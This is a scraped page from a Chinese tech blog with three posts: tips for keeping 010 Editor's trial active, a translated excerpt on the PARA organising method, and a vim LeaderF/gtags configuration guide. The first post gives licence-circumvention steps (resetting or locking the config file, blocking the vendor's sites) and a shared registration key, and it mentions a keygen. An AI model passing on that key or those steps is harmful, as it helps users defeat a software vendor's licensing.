-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/010editor/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/010editor/" class="post-title-link" itemprop="url">010editor 保持试用</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h2><p>010Editor是一款快速且强大的十六进制编辑器。用来编辑二进制文件。有一个友好易于使用的界面，无限次的<br>undo和redo操作。另外还可以打印十六进制的字节或者以书签的方式标出某些重要的字节。<br>支持二进制模板（binary template）系统。</p>
-<h2 id="保持试用"><a href="#保持试用" class="headerlink" title="保持试用"></a>保持试用</h2><p>国外软件很多时候相当厚道了，试用基本是全功能，轻微延时和不能自动更新二进制模板，就日常使用来说基本<br>是完全够用了。</p>
-<p>关键文件为 <code>~/.config/SweetScape/010 Editor.ini</code>，无法使用的时侯可以把这个文件清空，将恢复30天试用状态，<br>或者简单粗暴的将文件设置为只读。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 444 <span class="string">&quot;010 Editor.ini&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>用IDA逆向的时侯没有发现这个文件比较奇怪。这个文件是 是使用strace命令发现的，strace命令支持 <code>-e</code> 的过<br>滤参数将有效减少输出，一般来说看strace日志文件可以从最后往前看。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -e trace=file ./010editor</span><br></pre></td></tr></table></figure>
-
-<p>从代码上看有使用网络验证需要在hosts文件中屏敝两个网站， 可以减少一些不必要的麻烦。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 www.sweetscape.com</span><br><span class="line">127.0.0.1 www.010editor.com</span><br></pre></td></tr></table></figure>
-
-<p>我现在已经是注册用户了，在很长的一段时间内，这方法是管用的，做个备忘。</p>
-<p>scz 补充：</p>
-<p>之前github上的那个开源keygen还能用，或者就用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user    user</span><br><span class="line">pass    3470D4AC7CEFACD9297A</span><br></pre></td></tr></table></figure>
-
-<p>只是hosts更改可能不够，windows上用wf.msc阻止010 Editor联网，Linux好像没有简单办法阻止特定进程联网，<br>只能变相利用uid、gid达成目的。</p>
-<p>How to block internet access to certain programs on Linux<br><a target="_blank" rel="noopener" href="https://serverfault.com/questions/550276/how-to-block-internet-access-to-certain-programs-on-linux">https://serverfault.com/questions/550276/how-to-block-internet-access-to-certain-programs-on-linux</a></p>
-<p><a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/104830/block-specific-application-with-iptables">https://unix.stackexchange.com/questions/104830/block-specific-application-with-iptables</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/PARA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/PARA/" class="post-title-link" itemprop="url">(译文) 一秒钟内整理数字生活的系统 by claude</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-08-04 00:00:00" itemprop="dateCreated datePublished" datetime="2023-08-04T00:00:00+08:00">2023-08-04</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>The PARA Method: The Simple System for Organizing Your Digital Life in Seconds<br><a target="_blank" rel="noopener" href="https://fortelabs.com/blog/para">https://fortelabs.com/blog/para</a></p>
-<p>想象一下完美的组织系统。一个系统会告诉你如何确切地把生活中的每一件信息-每份文件、笔记、日程、大纲和研究的碎片-放在哪里,以及之后如何轻松地找到它们。</p>
-<p>这样的系统需要非常简单易用,也非常容易维护。毕竟,只有最简单、最轻松的习惯能长期坚持。</p>
-<p>它需要灵活适应你在不同人生阶段的需求,同时也需要全面,这样你可以在存储信息的各个地方使用它,比如你的电脑文件系统、云存储平台(如Dropbox或谷歌云端硬盘)或者数字笔记应用。</p>
-<p>但是最重要的是,理想的组织系统能够直接带来工作和生活中的实实在在的好处。它会极大地加速你完成最重要的项目和实现目标。</p>
-<p>换句话说, <strong>组织你的生活的最佳系统,是可操作的</strong>。</p>
-<p>它不会给你制造更多障碍,不会推迟那些能带来进步的行动,而是让这些行动更接近和更容易开始与完成。</p>
-<p>通过十多年的个人实践、指导数千学生以及辅导世界级专业人士,我已经制定出这样的系统。</p>
-<p><strong>它被称为PARA - 一个简单、全面的且极其灵活的系统,可以组织任何类型的数字信息,跨任何平台。</strong></p>
-<p>我向你保证,它不仅能把你的生活井井有条,还能让你掌握一套工具,巧妙地掌控信息流,以实现你设想的一切。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/cn/PARA/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/vim_gtags_leaderf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/vim_gtags_leaderf/" class="post-title-link" itemprop="url">在 vim 中使用 LeaderF 和 gtags</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-07-20 00:00:00" itemprop="dateCreated datePublished" datetime="2023-07-20T00:00:00+08:00">2023-07-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2023-07-24 00:00:00" itemprop="dateModified" datetime="2023-07-24T00:00:00+08:00">2023-07-24</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="☆-缘由和一些-vim-历史"><a href="#☆-缘由和一些-vim-历史" class="headerlink" title="☆ 缘由和一些 vim 历史"></a>☆ 缘由和一些 vim 历史</h2><p>前些年 vim 没有子窗口的概念，日本的一个 vim 插件作者为了解决这个问题生撸了一套流程，当时 unite.vim 横空出世惊艳了我一把。后面随着技术发展，neovim 和 vim 先后引入了 floating window ，这才使得情况变得好了一点。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vim/vim/blob/master/runtime/doc/popup.txt">https://github.com/vim/vim/blob/master/runtime/doc/popup.txt</a><br><a target="_blank" rel="noopener" href="https://neovim.io/doc/user/api.html#api-floatwin">https://neovim.io/doc/user/api.html#api-floatwin</a></p>
-<p>得益于新技术，在 vim 中使用 LeaderF 插件的交互体验上了一个台阶。</p>
-<p><img src="https://raw.githubusercontent.com/Yggdroot/Images/master/leaderf/leaderf_popup.gif" alt="Demo"></p>
-<p>neovim 从 0.9 版本开始放弃对 cscope 的支持 <a target="_blank" rel="noopener" href="https://twitter.com/Neovim/status/1580933880579641344">https://twitter.com/Neovim/status/1580933880579641344</a></p>
-<p>这给我阅读源码造成了一些问题，虽然 vim 仍然可以使用 cscope，但 vim 的启动速度不如 nvim 快，所以我开始寻找替代方案。同时，我发现 denite.nvim，unite.vim，作者也不怎么维护了，一想似乎是很多年没有维护 vim 配置了。</p>
-<p>在网络上搜索在 neovim 上阅读源码的方法，无意发现有人提到用 LeaderF 替代 tagbar，于是有了现在的这篇文章。</p>
-<h2 id="☆-安装vim-插件-LeaderF"><a href="#☆-安装vim-插件-LeaderF" class="headerlink" title="☆ 安装vim 插件 LeaderF"></a>☆ 安装vim 插件 LeaderF</h2><p>插件的仓库地址：<a target="_blank" rel="noopener" href="https://github.com/Yggdroot/LeaderF/tree/master">https://github.com/Yggdroot/LeaderF/tree/master</a></p>
-<p>使用 <a target="_blank" rel="noopener" href="https://github.com/VundleVim/Vundle.vim">Vundle.vim</a> 安装，在 .vimrc 中添加下面一行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plug &#x27;Yggdroot/LeaderF&#x27;, &#123; &#x27;do&#x27;: &#x27;:LeaderfInstallCExtension&#x27; &#125;</span><br></pre></td></tr></table></figure>
-
-<p>在 vim 中执行下面命令，即可成功安装，如果遇到网络问题，自己挂上线路即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">：so %</span><br><span class="line">:PlugInstall</span><br></pre></td></tr></table></figure>
-
-<h2 id="☆-LeaderF-配置"><a href="#☆-LeaderF-配置" class="headerlink" title="☆ LeaderF 配置"></a>☆ LeaderF 配置</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let g:Lf_WorkingDirectoryMode = <span class="string">&#x27;Ac&#x27;</span></span><br><span class="line">let g:Lf_RootMarkers = [<span class="string">&#x27;.git&#x27;</span>, <span class="string">&#x27;.svn&#x27;</span>, <span class="string">&#x27;.hg&#x27;</span>, <span class="string">&#x27;.project&#x27;</span>, <span class="string">&#x27;.root&#x27;</span>]</span><br><span class="line">let g:Lf_DefaultExternalTool=<span class="string">&#x27;rg&#x27;</span></span><br><span class="line">let g:Lf_WindowPosition = <span class="string">&#x27;popup&#x27;</span></span><br><span class="line"></span><br><span class="line">let g:Lf_UseCache = <span class="number">0</span></span><br><span class="line">let g:Lf_PreviewInPopup = <span class="number">1</span></span><br><span class="line"><span class="string">&quot;let g:Lf_CacheDirectory = s:cachedir</span></span><br><span class="line"><span class="string">let g:Lf_ShowHidden = 1  &quot;</span>show hidden files</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; preview or not</span></span><br><span class="line"><span class="string">let g:Lf_PreviewResult = &#123;&#x27;Function&#x27;: 0, &#x27;BufTag&#x27;: 0 &#125;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>g:Lf_WorkingDirectoryMode &#x3D; ‘AF’ 设置工作目录，如果没有找到 RootMarker 以当前文件所在目录作为工作目录</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">g:Lf_WorkingDirectoryMode                       *g:Lf_WorkingDirectoryMode*</span><br><span class="line">    This option customizes LeaderF&#x27;s working directory.</span><br><span class="line">    e.g., &gt;</span><br><span class="line">    let g:Lf_WorkingDirectoryMode = &#x27;Ac&#x27;</span><br><span class="line">&lt;</span><br><span class="line">    c - the directory of the current working directory.(default)</span><br><span class="line">    a - the nearest ancestor of current working directory that contains one of</span><br><span class="line">        directories or files defined in |g:Lf_RootMarkers|. Fall back to &#x27;c&#x27; if</span><br><span class="line">        no such ancestor directory found.</span><br><span class="line">    A - the nearest ancestor of current file that contains one of directories</span><br><span class="line">        or files defined in |g:Lf_RootMarkers|. Fall back to &#x27;c&#x27; if no such</span><br><span class="line">        ancestor directory found.</span><br><span class="line">    f - the directory of the current file.</span><br><span class="line">    F - if the current working directory is not the direct ancestor of current</span><br><span class="line">        file, use the directory of the current file as LeaderF&#x27;s working</span><br><span class="line">        directory, otherwise, same as &#x27;c&#x27;.</span><br><span class="line">    Note: if &quot;f&quot;, &quot;F&quot; is included with &quot;a&quot; or &quot;A&quot;, use the behavior of &quot;f&quot; or</span><br><span class="line">    &quot;F&quot;(as a fallback) when a root can&#x27;t be found.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>g:Lf_DefaultExternalTool  索引文件使用的外部工具，可选值为 ‘rg’, ‘pt’, ‘ag’, ‘find’，作者推荐使用 <a target="_blank" rel="noopener" href="https://github.com/BurntSushi/ripgrep">rg</a></li>
-<li>g:Lf_UseCache 列文件时是否使用缓存，默认值为 1，设置为 0 不使用缓存</li>
-<li>g:Lf_WindowPosition，LeaderF 窗口的位置，可选值有 top, bottom, left, right, popup,fullscreen，默认值为 bottom</li>
-<li>g:Lf_PreviewInPopup 设置是否在 LeaderF 的 popup 窗口显示预览, 默认值为 0</li>
-<li>g:Lf_ShowHidden 是否显示隐藏文件和目录，默认值为 0 不显示隐藏文件</li>
-<li>g:Lf_PreviewResult 设置需要显示预览的内容，默认值为全 1<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">g:Lf_PreviewResult</span> = &#123;</span><br><span class="line">        \ <span class="string">&#x27;File&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Buffer&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Mru&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Tag&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;BufTag&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Function&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Line&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Colorscheme&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Rg&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        \ <span class="string">&#x27;Gtags&#x27;</span>: <span class="number">1</span></span><br><span class="line">        \&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>配置好了 LeaderF，在 vim&#x2F;neovim 的命令行输入  <code>:Leaderf</code>  tab 就可以看到相关的命令了，如果忘记了具体的命令也没有关系，使用 <code>LeaderfSelf</code> 即可列出所有的 Leaderf 命令。如何想查看具体命令的使用方法，在命令窗口输入 <code>:Leaderf -h</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">subcommands:</span><br><span class="line"></span><br><span class="line">  &#123;file,tag,function,mru,searchHistory,cmdHistory,help,line,colorscheme,gtags,</span><br><span class="line">      self,bufTag,buffer,rg,filetype,command,window,quickfix,loclist,jumps&#125;</span><br><span class="line">    file                search files</span><br><span class="line">    tag                 navigate tags using the tags file</span><br><span class="line">    function            navigate functions or methods in the buffer</span><br><span class="line">    mru                 search most recently used files</span><br><span class="line">    searchHistory       execute the search command in the history</span><br><span class="line">    cmdHistory          execute the command in the history</span><br><span class="line">    help                navigate the help tags</span><br><span class="line">    line                search a line in the buffer</span><br><span class="line">    colorscheme         switch between colorschemes</span><br><span class="line">    gtags               navigate tags using the gtags</span><br><span class="line">    self                execute the commands of itself</span><br><span class="line">    bufTag              navigate tags in the buffer</span><br><span class="line">    buffer              search buffers</span><br><span class="line">    rg                  grep using rg</span><br><span class="line">    filetype            navigate the filetype</span><br><span class="line">    command             execute built-in/user-defined Ex commands.</span><br><span class="line">    window              search windows.</span><br><span class="line">    quickfix            navigate the quickfix.</span><br><span class="line">    loclist             navigate the location list.</span><br></pre></td></tr></table></figure>
-
-<p>好了，我可以放弃 fzf.vim, ctrp.vim, tagbar, unite.vim, denite.vim 等一系列 vim 插件了。 在日常使用中，每次都输入那么长的命令不太方便，我们可以配置以下容易记忆的快捷键。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">noremap &lt;leader&gt;fs :LeaderfSelf&lt;cr&gt;</span><br><span class="line">noremap &lt;leader&gt;fm :LeaderfMru&lt;cr&gt;</span><br><span class="line">noremap &lt;leader&gt;ff :LeaderfFunction&lt;cr&gt;</span><br><span class="line">noremap &lt;leader&gt;fb :LeaderfBuffer&lt;cr&gt;</span><br><span class="line">noremap &lt;leader&gt;ft :LeaderfBufTag&lt;cr&gt;</span><br><span class="line">noremap &lt;leader&gt;fl :LeaderfLine&lt;cr&gt;</span><br><span class="line">noremap &lt;leader&gt;fw :LeaderfWindow&lt;cr&gt;</span><br></pre></td></tr></table></figure>
-
-<p>值得一提的是 rg 命令，可以直接在目录文件内搜索字符串，ripgrep 的正则表达式比 vim 的正则要正常多了。vim 的正则表达式的用法可以参见：<a target="_blank" rel="noopener" href="https://vimdoc.sourceforge.net/htmldoc/pattern.html">https://vimdoc.sourceforge.net/htmldoc/pattern.html</a><br>以前我为了规避 vim 的正则使用了一个插件 <a target="_blank" rel="noopener" href="https://github.com/othree/eregex.vim">https://github.com/othree/eregex.vim</a> 现在这个插件也不需要了。</p>
-<p>要利用 LeaderF 调用 rg 命令，可以使用命令行 <code>:Leaderf! rg</code>, 为了方便使用使用下面的快捷键查询光标所在 word</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;leader&gt;frb &lt;Plug&gt;LeaderfRgCwordLiteralBoundary</span><br></pre></td></tr></table></figure>
-
-<h3 id="运行-LeaderF-之后的操作"><a href="#运行-LeaderF-之后的操作" class="headerlink" title="运行 LeaderF 之后的操作"></a>运行 LeaderF 之后的操作</h3><p>在执行 Leaderf 命令弹出的界面后，需要使用特定的快捷键进行操作，这些快捷键可以使用 <code>help leaderf-prompt</code> 进行查看。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Once LeaderF is launched:                       *prompt* *leaderf-prompt*</span><br><span class="line">    &lt;C-C&gt;, &lt;ESC&gt; : quit from LeaderF.</span><br><span class="line">    &lt;C-R&gt; : switch between fuzzy search mode and regex mode.</span><br><span class="line">    &lt;C-F&gt; : switch between full path search mode and name only search mode.</span><br><span class="line">    &lt;Tab&gt; : switch to normal mode.</span><br><span class="line">    &lt;C-V&gt;, &lt;S-Insert&gt; : paste from clipboard.</span><br><span class="line">    &lt;C-U&gt; : clear the prompt.</span><br><span class="line">    &lt;C-W&gt; : delete the word before the cursor in the prompt.</span><br><span class="line">    &lt;C-J&gt;, &lt;C-K&gt; : navigate the result list.</span><br><span class="line">    &lt;Up&gt;, &lt;Down&gt; : recall last/next input pattern from history.</span><br><span class="line">    &lt;2-LeftMouse&gt; or &lt;CR&gt; : open the file under cursor or selected(when</span><br><span class="line">                            multiple files are selected).</span><br><span class="line">    &lt;C-X&gt; : open in horizontal split window.</span><br><span class="line">    &lt;C-]&gt; : open in vertical split window.</span><br><span class="line">    &lt;C-T&gt; : open in new tabpage.</span><br><span class="line">    &lt;F5&gt;  : refresh the cache.</span><br><span class="line">    &lt;C-LeftMouse&gt; or &lt;C-S&gt; : select multiple files.</span><br><span class="line">    &lt;S-LeftMouse&gt; : select consecutive multiple files.</span><br><span class="line">    &lt;C-A&gt; : select all files.</span><br><span class="line">    &lt;C-L&gt; : clear all selections.</span><br><span class="line">    &lt;BS&gt;  : delete the preceding character in the prompt.</span><br><span class="line">    &lt;Del&gt; : delete the current character in the prompt.</span><br><span class="line">    &lt;Home&gt;: move the cursor to the begin of the prompt.</span><br><span class="line">    &lt;End&gt; : move the cursor to the end of the prompt.</span><br><span class="line">    &lt;Left&gt;: move the cursor one character to the left.</span><br><span class="line">    &lt;Right&gt; : move the cursor one character to the right.</span><br><span class="line">    &lt;C-P&gt; : preview the result.</span><br><span class="line">    &lt;C-Up&gt; : scroll up in the popup preview window.</span><br><span class="line">    &lt;C-Down&gt; : scroll down in the popup preview window.</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>tab : 切换输入模式和 normal 模式，进入 normal 模式后可以使用 <code>j</code> 和 <code>k</code> 上下移动光标来查看文件。 </li>
-<li>q :  normal 模式中，退出 LeaderF</li>
-</ul>
-<p>在输入模式下，可以使用下面的快捷键进行分屏显示。</p>
-<ul>
-<li>ctrl + x : 横向分割</li>
-<li>ctrl + ] : 竖向分割</li>
-<li>ctrl + T : tab 分割</li>
-</ul>
-<h2 id="☆-LeaderF-gtags-的配置"><a href="#☆-LeaderF-gtags-的配置" class="headerlink" title="☆ LeaderF + gtags 的配置"></a>☆ LeaderF + gtags 的配置</h2><p>gtags 和 LeaderF 配置起来使用，实在是很不错。首先要配置好 gtags，关于 global 的安装详见 <a target="_blank" rel="noopener" href="https://www.usmacd.com/2023/03/02/gtags-cscope/">GNU Global 的使用</a>，这里就不再详细说了，gtags 的配置添加下面两行即可。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let $GTAGSLABEL=<span class="string">&#x27;native-pygments&#x27;</span></span><br><span class="line">let $GTAGSCONF=<span class="string">&#x27;/usr/local/share/gtags/gtags.conf&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>配置好系统 gtags，global ，gtags.conf 的正确路径。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let g:Lf_Global = <span class="string">&#x27;/usr/local/bin/global&#x27;</span></span><br><span class="line">let g:Lf_Gtags = <span class="string">&#x27;/usr/local/bin/gtags&#x27;</span></span><br><span class="line">let g:Lf_Gtagsconf = <span class="string">&#x27;/usr/local/share/gtags/gtags.conf&#x27;</span></span><br><span class="line">let g:Lf_Gtagslabel = <span class="string">&#x27;native-pygments&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>下面两行是配置gtags 自动生成 tags 文件，主要是三个文件 <code>GPATH</code> , <code>GRTAGS</code>  <code>GTAGS</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let g:Lf_GtagsAutoGenerate = <span class="number">1</span></span><br><span class="line">let g:Lf_GtagsAutoUpdate = <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>g:Lf_GtagsAutoGenerate  是否自动生成 tags 文件。设置成 1 并且在 g:Lf_RootMarkers 定义的目录中，tags 会自动生成</li>
-<li>g:Lf_GtagsAutoUpdate 是否自动更新 tags。如果设置成 0 ，需要先执行 <code>Leaderf gtags --update</code> 手动更新 tags 文件</li>
-</ul>
-<p>tags 文件生成的目录和 <code>g:Lf_CacheDirectory</code> 的配置相关， g:Lf_CacheDirectory 用于设置缓存文件目录，默认的目录是 $HOME (Windows 上会有变化)使用 <code>_</code> 替换了 <code>/</code> 。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> ~/.LfCache/gtags/_home_henices_.vim </span><br><span class="line">GPATH  GRTAGS  GTAGS</span><br></pre></td></tr></table></figure>
-
-<p>完成了上面的配置后，我们就可以正常使用 LeaderF 来对 gtags 生成的 tags 文件进行浏览了，在命令行使用 <code>:Leaderf gtags -h</code> 可以看到详细的命令。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">:Leaderf gtags -h</span><br><span class="line">usage:</span><br><span class="line">Leaderf[!] gtags [-h] [--remove] [--recall]</span><br><span class="line">Leaderf[!] gtags --update [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [--accept-dotfiles]</span><br><span class="line">                 [--skip-unreadable] [--skip-symlink [&lt;TYPE&gt;]] [--gtagslibpath &lt;PATH&gt; [&lt;PATH&gt; ...]]</span><br><span class="line">Leaderf[!] gtags [--current-buffer | --all-buffers | --all] [--result &lt;FORMAT&gt;] [COMMON_OPTIONS]</span><br><span class="line">Leaderf[!] gtags -d &lt;PATTERN&gt; [--auto-jump [&lt;TYPE&gt;]] [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;]</span><br><span class="line">                 [--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]</span><br><span class="line">Leaderf[!] gtags -r &lt;PATTERN&gt; [--auto-jump [&lt;TYPE&gt;]] [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;]</span><br><span class="line">                 